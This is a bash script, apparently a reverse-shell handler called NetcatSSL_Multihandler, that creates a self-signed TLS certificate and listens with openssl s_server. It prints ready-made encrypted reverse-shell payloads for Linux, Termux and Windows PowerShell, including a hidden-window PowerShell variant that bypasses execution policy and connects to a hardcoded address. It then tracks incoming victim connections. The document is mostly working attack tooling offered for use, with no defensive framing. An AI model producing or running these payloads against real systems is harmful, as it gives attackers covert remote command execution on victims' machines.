#!/bin/bash

# Check if cert.pem and key.pem exist, then remove them
[ -f cert.pem ] && rm cert.pem
[ -f key.pem ] && rm key.pem

# Start the main program
read -p "NetcatSSL_Multihandler host >>  " IP
read -p "Select your port >>  " port
PORT=$port
CERT="cert.pem"
KEY="key.pem"

echo -e "\e[93m"

# Generate SSL certificate 
echo "[*] Generating SSL certificate..."
openssl req -x509 -newkey rsa:4096 -keyout "$KEY" -out "$CERT" -days 365 -subj "/CN=NetcatSSL" 2>/dev/null


# Show the payload
echo -e "\e[97mCreating payload ...\n"
sleep 1
echo -e "\e[96mFor Linux"
echo -e "\e[90mmkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | openssl s_client -quiet -connect $IP:$port > /tmp/f; rm /tmp/f &>/dev/null &\n"
echo -e "\e[96mFor Termux"
echo -e "\e[90m(pkg list-installed | grep -q 'openssl\|openssl-tool' || pkg install openssl openssl-tool -y) && mkfifo /data/data/com.termux/files/usr/tmp/f; cat /data/data/com.termux/files/usr/tmp/f | bash -i 2>&1 | openssl s_client -quiet -connect $IP:$port > /data/data/com.termux/files/usr/tmp/f; rm /data/data/com.termux/files/usr/tmp/f &>/dev/null\n"
echo -e "\e[96mFor Windows (Normal)"
echo -e "\e[90m[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;\$client=New-Object System.Net.Sockets.TcpClient(\"$IP\",$port);\$stream=\$client.GetStream();\$sslStream=New-Object System.Net.Security.SslStream(\$stream,\$false,{param(\$s,\$c,\$ch,\$e) return \$true});\$sslStream.AuthenticateAsClient(\"$IP\",\$null,[System.Security.Authentication.SslProtocols]::Tls12,\$false);\$writer=New-Object System.IO.StreamWriter(\$sslStream);\$reader=New-Object System.IO.StreamReader(\$sslStream);\$writer.AutoFlush=\$true;try{while(\$client.Connected){\$cmd=\$reader.ReadLine();if(\$cmd -and \$cmd.Trim() -ne \"\"){\$output=Invoke-Expression \$cmd 2>&1|Out-String;\$writer.WriteLine(\$output)}}}catch{Write-Host \"Error: \$_\"}finally{\$client.Close()}\n"
echo -e "\e[96mFor Windows(Background)"
echo -e "\e[90mStart-Process powershell.exe -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12; \$client=New-Object System.Net.Sockets.TcpClient(\\\"10.23.24.247\\\",2222); \$stream=\$client.GetStream(); \$sslStream=New-Object System.Net.Security.SslStream(\$stream,\$false,{param(\$s,\$c,\$ch,\$e) return \$true}); \$sslStream.AuthenticateAsClient(\\\"10.23.24.247\\\",\$null,[System.Security.Authentication.SslProtocols]::Tls12,\$false); \$writer=New-Object System.IO.StreamWriter(\$sslStream); \$reader=New-Object System.IO.StreamReader(\$sslStream); \$writer.AutoFlush=\$true; try { while(\$client.Connected) { \$cmd=\$reader.ReadLine(); if(\$cmd -and \$cmd.Trim() -ne \\\"\\\") { \$output=Invoke-Expression \$cmd 2>&1 | Out-String; \$writer.WriteLine(\$output) } } } catch { Write-Host \\\"Error: \$_\\\" } finally { \$client.Close() }\"'"


# Listen the connection
echo -e "\e[95m"
sleep 1
echo "[*] Listening for incoming SSL connections on port $PORT..."
declare -A clients  # Track connected clients

(while true; do 
    # Get list of currently connected IPs
    current_clients=($(netstat -tn 2>/dev/null | awk '$4 ~ /:'"$PORT"'$/ && $6 == "ESTABLISHED" {print $5}' | cut -d: -f1))

    # Check for new connections
    for ip in "${current_clients[@]}"; do 
        if [[ -z "${clients[$ip]}" ]]; then  # If new client detected
            echo -e "\e[92m[+] New client connected from $ip!\e[0m"
            clients[$ip]=1  # Mark as connected
        fi
    done

    # Check for disconnected clients
    for ip in "${!clients[@]}"; do 
        if [[ ! " ${current_clients[*]} " =~ " $ip " ]]; then  # If client is missing
            echo -e "\e[91m[-] Client disconnected: $ip\e[0m"
            unset clients[$ip]  # Remove from tracking
        fi
    done

    sleep 2  # Reduce CPU usage
done) &  

openssl s_server -quiet -cert "$CERT" -key "$KEY" -port "$PORT"

